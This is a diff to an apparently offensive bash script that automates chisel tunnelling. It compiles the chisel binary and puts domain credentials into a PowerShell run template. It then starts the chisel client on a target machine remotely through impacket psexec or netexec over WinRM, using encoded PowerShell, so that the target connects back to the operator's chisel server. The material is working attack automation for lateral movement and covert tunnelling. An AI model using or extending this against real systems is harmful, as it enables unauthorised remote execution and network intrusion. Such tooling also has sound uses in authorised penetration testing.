@@ -39,6 +39,10 @@ compile_chisel() {
         main_file="main.exe"
         chisel_file="chisel.exe"
     fi
+    #overwrite chisel file name if provided
+    if [[ ! -z $chisel_filename ]]; then
+        chisel_file=$chisel_filename
+    fi
     if [[ -f "$chisel_file" ]]; then
         echo "Chisel binary already exists, skipping compilation."
         return 1
@@ -207,6 +211,12 @@ get_chisel_client_commands() {
             argument_list="client $chisel_server_ip:$chisel_server_port $chisel_client_options"
             argument_list=$(escape_sed "$argument_list")
             sed -i -E "s/\{argument_list\}/$argument_list/g" run_command.ps1
+            if [[ ! -z "$domain" ]]; then
+                sed -i -E "s/\{username\}/$domain\\\\$username/g" run_command.ps1
+            else
+                sed -i -E "s/\{username\}/$username/g" run_command.ps1
+            fi
+            sed -i -E "s/\{password\}/$password/g" run_command.ps1
             local command='Start-Process -FilePath "'$chisel_file'" -ArgumentList "client", "'$chisel_server_ip':'$chisel_server_port'", "'$chisel_client_options'"'
             command=$(escape_sed "$command")
             sed -i -E "s/\{run_command\}/$command/g" run_command.ps1
@@ -334,9 +344,26 @@ run_chisel_command_psexec() {
          echo "Target IP is not set. Assuming not neccesary to set via this function"
          return 1
     fi
-    cmd=$(encode_powershell "$chisel_command")
-    run_cmd=true
-    run_impacket_psexec
+    if [[ -z $automatic_connect_chisel ]]; then
+        automatic_connect_chisel=true
+    fi
+    if [[ -z $automatic_connect_chisel_type ]]; then
+        automatic_connect_chisel_type="psexec"
+    fi
+    if [[ $automatic_connect_chisel == "true" ]] && [[ $automatic_connect_chisel_type == "psexec" ]]; then
+        cmd=$(encode_powershell "$chisel_command")
+        run_cmd=true
+        run_impacket_psexec
+    elif [[ $automatic_connect_chisel == "true" ]] && [[ $automatic_connect_chisel_type == "winrm" ]]; then
+        cmd=$(minimize_script "$chisel_command")
+        cmd=$(encode_powershell "$cmd")
+        run_cmd=true
+        netexec_protocol="winrm"
+        run_netexec
+    else
+        echo "Automatic chisel connection is disabled. Please run the the commands manually"
+    fi
+
 }
 
 compile_and_start_chisel_server() {
